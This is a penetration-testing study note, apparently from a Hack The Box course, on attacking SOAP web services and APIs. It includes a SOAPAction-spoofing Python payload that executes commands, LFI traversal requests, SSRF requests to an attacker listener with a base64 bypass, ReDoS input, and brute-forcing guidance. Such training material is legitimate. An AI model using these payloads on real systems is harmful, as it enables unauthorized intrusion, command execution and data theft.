Web services enable different applications to communicate with each other. An `application programming interface (API)` is a set of rules that enables data transmission between different software. 
- Web services are a type of API, but the opposite is not always true! = some of the web services technologies are XML-RPC, JSON-RPC, SOAP, WS-BPEL, RESTful...
- WSDL (Web Service Description Language) = XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.
We'll want to `find the SOAP web service's WSDL file` if it exists, by fuzzing the web application. If we found a `WSDL` file but we cannot read it, we should fuzz for available parameter to read it
```bash
# Fuzz for parameter to read the WSDL file
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200
```



# Web Service Attacks
## SOAPAction Spoofing
- Let's say here we've found a `WSDL` file in a `SOAP` web service that we can call & read using the `?wsdl` parameter like `http://<TARGET IP>:3002/wsdl?wsdl`.
SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called `SOAPAction`, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.
- If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing
```bash
# Read the service's WSDL file 
curl http://<TARGET IP>:3002/wsdl?wsdl
```
- Reading the `WSDL` file, we may see a `SOAPAction` operation that do interesting thing. Let's say here we've found one called `ExecuteCommand`. 
- We could look in the `WSDL` file at the `parameters used` by the `SOAPAction` to issues requests & trigger the functionnality
- We could use `python scripts` to try to have the `SOAP` service execute a `whoami` command
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- If we get an error `This function is only allowed in internal networks`, we can try to `spoof the SOAPAction` by specifying `LoginRequest` in `<soap:Body>`, so that our request goes through because this operation is allowed from the outside. 
```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
- If the web service determines the operation to be executed based solely on the `SOAPAction header`, we may bypass the restrictions and have the SOAP service execute a `whoami` command
## Command Injection
If a web service uses `user-controlled input` to execute a system command on the back-end server, an attacker may be able to exploit it.
- Sometimes it could be a `connectivity-checking` web service that is merely executing a `ping` command towards a website of our choosing. To verify that the app is sending ping requests, we can input our 
```bash
# Listening for incoming ping requests from another host
sudo tcpdump -i tun0 icmp
```
- We could then try to reveal a [[Command Injections]] vulnerability, and then read sensitive files on the system.



# API Attacks : OWASP TOP TEN
When we face APIs, we must spend considerable time on `fuzzing` both `endpoints` and `parameters`.
```bash
# API endpoint fuzzing
ffuf -w "/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'

# Perform API's parameter fuzzing
ffuf -w "/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19

# Try the found parameter
curl http://<TARGET IP>:3003/?id=1
```

The tool [webfuzz_api](https://github.com/PandaSt0rm/webfuzz_api) can help us automate the process of enumerating APIs 

When we found an interesting `API endpoint` like `http://IP:PORT/api/endpoint?parameter=` we should always try various payloads of `SQLi, LFI, SSRF, and XSS if the parameter value gets reflected in the response`.

Basically, we should try `OWASP TOP Ten` over APIs endpoints when we found them.

## Broken Object Level Authorization (aka IDOR or BOLA)
Web APIs can allow users to request data or records by sending various parameters, including `UUIDs`, also known ad `GUIDs`, or integer `IDs`. Failing to properly and securely verify that a user has ownership and permission to view a specific resource through `objet-level authorization mechanisms` can lead to data exposure or security vulnerabilities.

If we come accross `IDs` or `UUIDs` when requesting a resource, we should always try to enumerate resource with other values (fuzz).

## Broken Authentication
We should also verify [Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) mechanisms of APIs. 
- We could try to `bruteforce account's passwords` if password policy is weak, and if there is no rate-limiting
- We could try to `bruteforce OTPs` if there is a `password reset` functionnality
- We could try to `modify / guess security questions` to try to takeover an accoun, if implemented.

## Broken Object Property Level Authorization
It combines two subclasses: `Excessive Data Exposure` (when the API reveals sensitive data to authorized users that they are not supposed to access) and `Mass Assignment` (when the API permits authorized users to manipulate sensitive object properties beyond their authorized scope, including modifying, adding, or deleting values).

We should check what data all APIs endpoints returns, to see if it doesn't get too  verbose.

Within those data, we should try to send modified values to see if we can retrieve more privileges within the scope of the APIs.

## Unrestricted Resource Consumption
Sometimes APIs fails to limit user-initiated requests that consume resources such as `network bandwidth`, `CPU`, `memory`, and `storage`. These resources incur significant costs, and without adequate safeguards—particularly effective rate-limiting—against excessive usage, users can exploit these vulnerabilities and cause financial damage.

- Again, don't forget to fuzz the `API` for new endpoints / parameters !

Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.
- We're working w/ the following `API`
```bash
# Default APIs
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}

# Input valid value to increase the response (evaluation) time by the API
curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
```
- The longer the payload would be, the longer the API will take to respond


We should check, if an APIs uses some credits-limited or paid function, to bruteforce it to see if we can bypass or exceed the default limit, and thus generate additional fees.

## Broken Function Level Authorization (aka BFLA)
A web API is vulnerable to `Broken Function Level Authorization (BFLA)` if it allows unauthorized or unprivileged users to interact with and invoke privileged endpoints, granting access to sensitive operations or confidential information. The difference between `BOLA` and `BFLA` is that, in the case of `BOLA`, the user is authorized to interact with the vulnerable endpoint, whereas in the case of `BFLA`, the user is not.

To test this, we have to check if an API endpoint that requires privileges, can be use without those privileges.

## Unrestricted Access to Sensitive Business Flows
All businesses operate to generate revenue; however, if a web API exposes operations or data that allows users to abuse them and undermine the system (for example, by buying goods at a discounted price), it becomes vulnerable to `Unrestricted Access to Sensitive Business Flows`. An API endpoint is vulnerable if it exposes a sensitive business flow without appropriately restricting access to it.

For example, we could determine the dates when the enterprise will discount their products, and the corresponding discount rates, to buy it cheaper and thus gain money over the company.

## Security Misconfiguration (SQLi, XSS, XXE, File Upload...)
Web APIs are susceptible to the same security misconfigurations that can compromise traditional web applications. One typical example is a web API endpoint that accepts `user-controlled input` and incorporates it into `SQL` queries `without proper validation`, thereby allowing Injection attacks.

But it could be `XSS` it the value gets reflected on the page, or `XXE` if it encompass XML, for example.

## SQL Injections in APIs
If we suspect that an API is retrieving datas based on `user-input queries` (it could be getting the count of products, or searching for a specific username...), we should try `SQL` payloads to break the syntax or generate errors.

## File Upload
- Again, don't forget to fuzz the `API` for new endpoints / parameters !
We could find `API endpoint` that allow us to `upload a file`. If we could retrieve the uploaded file, then we should try to upload malicious code ! We can look at [[File Upload]] if there is any `file upload restrictions` in place

We could also check if we're able to enumerate the uploaded folder destination if we have access to it.

## LFI
- Again, don't forget to fuzz the `API` for new endpoints / parameters !
We could also use the `API` to read local files on the server. See the [[File Inclusion]] module to get more info and bypasses techniques.

```bash
# API endpoint fuzzing
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```
- If we found a `parameter that let us specify a filename`, we should interact w/ it and test `LFI payloads` !
```bash
# Testing LFI payload on API endpoint
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
```

## XSS
- Again, don't forget to fuzz the `API` for new endpoints / parameters !
XSS vulnerabilities can be found in `APIs`. We can look at the [[Cross-Site Scripting (XSS)]] module to have ideas of exploitation. Let's say that we're working w/ the API `http://<TARGET IP>:3000/api/download`.
- We can interact w/ it by specifying values. We'll try here to input a `test_value` in the URL like `http://<TARGET IP>:3000/api/download/test_value`
![](https://academy.hackthebox.com/storage/modules/160/6.png)
- If we see that our `test value is being reflected in the response`, then we could try `XSS payloads`. We might need to `URL encode`the payload if passed in the URL
 
## SSRF
If the API uses `user-controlled input` to fetch `remote or local resources` without validation, them it could be vulnerable to `Server-Side Request Forgery`. It coerce the application to send a crafter request to an unexpected destination (espacially local ones), bypassing firewalls or VPNs.

- Again, don't forget to fuzz the `API` for new endpoints / parameters !
We could request internal or external resource by abusing a server's functionnality. We can refer to  [[Server-Side Request Forgery (SSRF)]] to have details. 
- To test `SSRF`, let's say we've found an `API endpoint` that takes an `id` parameter. We can start a netcat listener and try to reach our server by specifying our address & port as the parameter value !
```bash
# Test SSRF
curl "http://<TARGET IP>:3000/api/userinfo?id=http://IP:LISTENER_PORT"
```
- Sometimes if we get an `error` (and no ping on our netcat listener) this is because `APIs` expect `parameter values` in a specific format / encoding. We could try to `base64` encode our payload (parameter value) and try again !
```bash
# Bypass APIs parameter encoding -
echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```
If we get a call, then the app is vulnerable to SSRF.

## XXE
- Again, don't forget to fuzz the `API` for new endpoints / parameters !
`XXE` injection can be found when `XML data` is taken from a user-controlled input. [[XML External Entity (XXE)]] module cover XXE discovery methods & attacks if we found `XML` w/ an `API`, it will work the same.

## HTTP Headers
APIs can also suffer from security misconfigurations if they do not use proper [HTTP Security Response Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html). For example, suppose an API does not set a secure [Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) as part of its CORS (Cross-Origin Resource Sharing) policy. In that case, it can be exposed to security risks, most notably, [Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html) (`CSRF`).

## Improper Inventory Management
